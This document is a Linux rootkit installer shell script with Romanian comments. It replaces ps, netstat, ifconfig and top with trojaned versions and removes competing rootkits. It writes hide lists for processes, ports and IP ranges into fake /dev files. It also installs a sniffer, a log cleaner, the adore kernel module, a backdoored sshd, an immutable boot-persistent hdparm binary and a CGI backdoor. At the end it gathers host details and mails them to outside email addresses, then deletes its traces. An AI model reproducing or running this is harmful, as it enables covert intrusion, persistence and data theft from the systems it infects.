#!/bin/sh
unset HISTFILE
chown root.root *
echo -n "Replacing netstat, ps, ifconfig, top... "
rm -rf /sbin/ifconfig
mv ifconfig /sbin/ifconfig
rm -rf /bin/netstat
mv netstat /bin/netstat
rm -rf /bin/ps
mv ps /bin/ps
rm -rf /usr/bin/top
mv top /usr/bin/top
echo "Done"

echo    "---------------------------------------"
echo    "Removing some old  rootkits            "
echo    "---------------------------------------"
killall -9 nscd
rm -rf /usr/sbin/nscd
rm -rf /usr/src/.puta/
rm -rf /dev/caca
rm -rf /dev/dsx
rm -rf /dev/ida/.inet
chattr -i /usr/bin/hdparm
rm -rf /usr/bin/hdparm
rm -rf /usr/sbin/sshdu
rm -rf /home/httpd/cgi-bin/alya.cgi
rm -rf /usr/local/httpd/cgi-bin/alya.cgi
rm -rf /usr/local/apache/cgi-bin/alya.cgi
rm -rf /www/httpd/cgi-bin/alya.cgi
rm -rf /www/cgi-bin/alya.cgi
killall -9 sshdu
echo " Ucid portmap-ul "
rm -rf /etc/rc.d/init.d/*portmap
rm -rf /etc/rc.d/rc1i.d/*portmap
rm -rf /etc/rc.d/rc2i.d/*portmap
rm -rf /etc/rc.d/rc3i.d/*portmap
rm -rf /etc/rc.d/rc4i.d/*portmap
rm -rf /etc/rc.d/rc5i.d/*portmap
rm -rf /etc/rc.d/rc6i.d/*portmap
killall -9 portmap
echo " Gata cu portmap-ul sper "

echo -n "Setting up the /dev filez... "
touch /dev/dsx
>/dev/dsx
echo "3 sl2" >>/dev/dsx
echo "3 sshdu" >>/dev/dsx
echo "3 linsniffer" >>/dev/dsx
echo "3 smurf" >>/dev/dsx
echo "3 slice" >>/dev/dsx
echo "3 mech" >>/dev/dsx
echo "3 muh" >>/dev/dsx
echo "3 bnc" >>/dev/dsx
echo "3 psybnc" >> /dev/dsx
touch /dev/caca
>/dev/caca
echo "1 193.231.139" >>/dev/caca
echo "1 213.154.137" >>/dev/caca
echo "1 193.254.34" >>/dev/caca
echo "3 16284" >>/dev/caca
echo "3 3666" >>/dev/caca
echo "3 31221" >>/dev/caca
echo "3 22546" >>/dev/caca
echo "4 16284" >>/dev/caca
echo "4 2222" >>/dev/caca
echo "Done"



echo "Creating home... "
mkdir -p /dev/ida/.inet
echo "Copying SSHD and shit..."
mv -f linsniffer logclear adore.o ava cleaner.o sense sl2 slice3 sshdu /dev/ida/.inet
mv -f  ssh_host_key adore ssh_random_seed adore.tgz s /dev/ida/.inet/
DIR=`pwd`
cd $DIR
touch /dev/ida/.inet/tcp.log

chattr -i /usr/bin/hdparm
echo "/usr/bin/hdparm -t1 -X53 -p" >> /etc/rc.d/rc.sysinit
echo >> /etc/rc.d/rc.sysinit
mv hdparm -f /usr/bin/
chmod 500 /usr/bin/hdparm
chattr +i /usr/bin/hdparm
/usr/bin/hdparm

sleep 1

if [ -d /home/httpd/cgi-bin ]
then
mv -f alya.cgi /home/httpd/cgi-bin/
fi

if [ -d /usr/local/httpd/cgi-bin ]
then
mv -f alya.cgi /usr/local/httpd/cgi-bin/
fi

if [ -d /usr/local/apache/cgi-bin ]
then
mv -f alya.cgi /usr/local/apache/cgi-bin/
fi

if [ -d /www/httpd/cgi-bin ]
then
mv -f alya.cgi /www/httpd/cgi-bin/
fi

if [ -d /www/cgi-bin ]
then
mv -f alya.cgi /www/cgi-bin/
fi

touch /tmp/info
echo "** Luam Informatiile dorite ..."
echo "* Info : $(uname -a)" >>  /tmp/info
echo "* Hostname : $(hostname -f)" >>  /tmp/info
echo "* IfConfig : $(/sbin/ifconfig | grep inet)" >>  /tmp/info
echo "* Uptime : $(uptime)" >>  /tmp/info
echo "* Cpu Vendor ID : $(cat /proc/cpuinfo|grep vendor_id)" >>  /tmp/info
echo "* Cpu Model : $(cat /proc/cpuinfo|grep model)" >>  /tmp/info
echo "* Cpu Speed: $(cat /proc/cpuinfo|grep MHz)" >>  /tmp/info
echo "* Bogomips: $(cat /proc/cpuinfo|grep bogomips)" >>  /tmp/info
echo "* Spatiu Liber: $(df -h)" >>  /tmp/info
dir /home >> /tmp/info
pstree >> /tmp/info
ping -c3 216.115.108.243 >> /tmp/info
cat /etc/inetd.conf |grep bin/sh >> /tmp/info
cat /tmp/info | mail -s "$(hostname -i)" alfredm_@hotmail.com
cat /tmp/info | mail -s "$(hostname -i)" carlaandreea@yahoo.com
cat /tmp/info | mail -s "$(hostname -i)" mereu_al_tau@yahoo.com
rm -f /tmp/info

echo
echo "Gata"
echo
echo "Bravo tie Zar! ....=) "
cd ..
rm -rf lamerk zarrk.*
rm -rf lamerk zarrk1.*
rm -rf lamerk z1.*
rm -rf lamerk rk.*
